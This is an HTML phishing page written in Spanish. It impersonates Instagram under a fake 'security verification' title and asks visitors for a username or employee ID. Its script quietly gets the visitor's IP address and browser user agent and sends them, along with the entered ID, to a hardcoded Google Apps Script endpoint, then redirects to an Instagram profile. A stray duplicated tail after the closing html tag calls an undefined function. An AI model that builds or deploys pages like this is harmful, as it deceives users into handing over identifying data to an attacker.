<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad | Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 3px; }
        .logo { font-weight: bold; font-size: 24px; margin-bottom: 20px; color: #262626; }
        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
        input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; margin-bottom: 15px; font-size: 12px; }
        button { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px 0; border-radius: 4px; font-weight: 600; cursor: pointer; }
        button:hover { background-color: #1877f2; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">Seguridad de Red</div>
    <p>Para ver este contenido, por favor confirma tu nombre de usuario o ID de empleado para validar el acceso desde esta dirección IP.</p>
    
    <input type="text" id="userInput" placeholder="Nombre de usuario o ID" required>
    <button onclick="enviarAuditoria()">Validar Acceso</button>
</div>

<script>
    async function enviarAuditoria() {
        const userValue = document.getElementById('userInput').value;
        if (!userValue) { alert("Por favor ingresa tu identificación"); return; }

        document.querySelector('button').innerText = "Verificando...";

        try {
            // 1. Capturar IP
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            const ip = data.ip;

            // 2. Capturar Hardware
            const ua = navigator.userAgent;

            // 3. Tu URL de Google Apps Script
            const googleUrl = "https://script.google.com/macros/s/AKfycbzKmco6ixGg3HijjMVG8rrusr53L3ybLvW0i392T-ITHXSPXhjNqEN__9uHHrAO55MO/exec";

            // 4. Envío de datos y Redirección
            const finalUrl = `${googleUrl}?u=${encodeURIComponent(userValue)}&ip=${ip}&ua=${encodeURIComponent(ua)}`;
            window.location.href = finalUrl;

        } catch (error) {
            // Si falla la red, redirigir igual al destino final
            window.location.href = "https://www.instagram.com/jon_laptrona_moza?igsh=MWRqeGUwMW94NmFzNg==";
        }
    }
</script>

</body>
</html>
        capturarAuditoria();
    </script>
</body>
</html>
